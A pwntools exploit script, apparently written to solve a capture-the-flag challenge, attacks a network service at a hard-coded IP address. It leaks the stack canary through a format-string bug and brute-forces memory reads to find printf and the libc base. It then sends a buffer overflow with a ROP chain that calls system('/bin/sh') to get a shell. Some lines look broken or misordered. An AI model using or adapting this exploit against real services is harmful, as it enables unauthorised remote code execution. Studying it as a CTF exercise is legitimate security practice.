#!/usr/bin/env python3

from pwn import *

offset = 40

libc = ELF("./libc.so.6")


context.binary = libc


def conn():
    if args.LOCAL:
       r = remote("localhost", 1337)
#    else:
#        r = gdb.debug([exe.path])
    else:
       r = remote("188.166.149.59", 1337)

    return r


def main():
    r = conn()
    r.recvuntil(b"mine:")
    r.sendline(b"%51$p") 
#    r.interactive()
    #r.recvuntil(b"Please stay within the borders: ")
    canary = str(r.recvline()).strip("b'n\\").split(" ")[1]
    print(canary)
    print(r.recvuntil(b"from "))
    borders = str(r.recvline()).strip("b'n\\").split(" ")
    print(borders)

    print("LEAKING")

    for i in range(235000,1000000):
        #print(i)
        address = hex(int(borders[2],16)+i)
        #print(address)

        r.sendline(address.encode())

        result = r.recvuntil([b"(hex):", b"tweet tweet"])

        print(result)
        if b"_IO_printf" in result:
            print(i)
            print(result)
            printf_loc = int(result.split(b" ")[9].split(b"\n")[0],16)
            print(printf_loc)
            libc.address = printf_loc - libc.symbols['_IO_printf']
            print("libc:",hex(libc.address))
            break



    r.interactive()
    pop_rdi = libc.address + 0x000000000002a3e5
    print(hex(pop_rdi))
    system = libc.symbols['system']
    bin_sh = next(libc.search('/bin/sh'))


    rop = ROP(libc)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

    ret = rop.find_gadget(['ret'])[0]


    print("pop rdi:",hex(pop_rdi))
    print("bin_sh:",hex(bin_sh))
    print("ret:",hex(ret))
    print("system:",hex(system))

    payload = b"A"*40
 #   payload += b"B"*6
    payload += p64(int(canary,16))
    payload += p64(0)
    payload += p64(pop_rdi)
    payload += p64(bin_sh)
    payload += p64(ret)
    payload += p64(system)


    #print(r.recvuntil(b"(hex):"))

    print(payload)

    #r.sendline(b"q")
    #print("QUit?")
    #print(r.recvuntil(b"(y/N): "))
    r.sendline(payload)

    #print(borders)
    # good luck pwning :)
    r.interactive()


if __name__ == "__main__":
    main()
